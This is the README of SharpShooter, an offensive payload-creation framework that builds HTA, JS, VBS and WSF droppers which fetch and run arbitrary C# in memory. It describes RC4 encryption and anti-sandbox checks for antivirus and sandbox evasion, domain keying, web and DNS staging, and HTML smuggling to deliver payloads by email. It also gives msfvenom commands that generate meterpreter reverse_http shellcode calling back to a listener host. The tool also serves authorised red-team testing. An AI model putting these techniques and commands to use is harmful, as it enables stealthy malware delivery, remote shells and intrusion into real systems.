```
   _____ __                    _____ __                __           
  / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
 ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                     /_/                                            

```

Description
===========

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's DotNetToJavaScript tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using with Web or DNS delivery; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project.

SharpShooter payloads are RC4 encrypted to provide some anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.

SharpShooter includes a predefined CSharp template for executing shellcode, but any CSharp code can be compiled and invoked in memory using reflection, courtesy of CSharp's CodeDom.

Finally, SharpShooter provides the ability to bundle the payload in a HTML file using the Demiguise HTML smuggling technique.

Further information can be found on the MDSec blog post.

Usage:
======

SharpShooter uses an interactive menu to configure and build the payload options, each of the menu prompts are described below.

```
[*] Select the type of payload to generate:
[1] HTA
[2] JS
[3] JSE
[4] VBA
[5] VBE
[6] VBS
[7] WSF
```
The above menu selects the type of payload that you want to generate. Currently VBA is only partly supported, pending further development/research. The generated payload will be written to the "output" folder.

```
[*] The following anti-sandbox techniques are available:
[1] Key to Domain
[2] Ensure Domain Joined
[3] Check for Sandbox Artifacts
[4] Check for Bad MACs
[5] Check for Debugging
[0] Done
```

SharpShooter includes the ability to embed anti-sandbox defences in to the payload, these are predominantly taken from the CheckPlease project with the exception of Domain Keying which allows you to limit your payload to running only on domain members from a target domain. More than one technique can be selected and if the conditions are met, such as the host not being domain joined (2), then the payload will not execute. The theory here is that if the sandbox does not see the bad behaviour, it will assume it to be safe.

```
[*] Select the delivery method for the staged payload:
[1] Web Delivery
[2] PowerDNS Delivery
[3] Both
```

This menu option details the method that will be used to perform staging and whether this happens using web delivery, DNS or both. During this process, the payload will retrieve the CSharp source code from the provided URL; the source code is gzip'd and base64 encoded.

```
[*] Do you want to use the builtin shellcode template? Y/N
```

SharpShooter contains a basic template for executing shellcode, here you can paste in a CSharp byte array of either your x86 or x64 shellcode.

On 64-bit systems you must use x64 shellcode for JS/JSE, VBS/VBE and WSF payloads; you can generate it similar to the following:

```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True PrependMigrate=True -f csharp
```

For 32-bit or when handling HTA files, the shellcode must be x86 and can be generated as follows:

```
msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=172.16.164.203 LPORT=8080 EnableStageEncoding=True StageEncoder=x86/shikata_ga_nai -f csharp
```

When using web delivery, SharpShooter will prompt for the location where your CSharp payload is hosted:

```
[*] Provide URI for CSharp web delivery
```

Here you should provide the URL to where you've hosted the output.payload file. If you're using DNS delivery, you should provide the staging host where PowerDNS is running. It should be noted that SharpShooter will fallback to DNS delivery if web delivery fails, for example should your user not be able to make web requests in your target environment.

```
[*] Do you want to smuggle inside HTML?
```

When SharpShooter prompts as above, it offers the ability to perform a HTML smuggling attack. This will take the previously generated SharpShooter payload and embed it inside a HTML file, rc4 encrypted and retrievable via most modern browsers. This file can be useful for bypassing certain proxy restrictions such as MIME type or extension blocking, or submiting the payload via e-mail as HTML is a permitted attachment in most mail clients.
SharpShooter contains 2 pre-defined templates; it is recommended you create a custom template using these as an example.

Author and Credits
==================
Author: Dominic Chell (@domchell)

Credits:
- @tiraniddo: James Forshaw for DotNetToJScript
- @Arno0x0x: for EmbedInHTML
- @buffaloverflow: Rich Warren for Demiguise
- @arvanaghi and @ChrisTruncer: Brandon Arvanaghi and Chris Truncer for CheckPlease